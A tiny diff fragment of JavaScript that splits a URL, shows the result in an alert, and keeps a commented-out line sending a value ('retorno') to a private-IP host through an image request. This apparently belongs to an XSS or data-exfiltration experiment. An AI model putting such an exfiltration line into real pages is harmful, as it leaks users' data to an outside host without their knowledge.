@@ -6,4 +6,5 @@ var y = url.split("?");
 alert(y);
 
 
+
 // new Image().src = "http://192.168.0.123/?=" + retorno
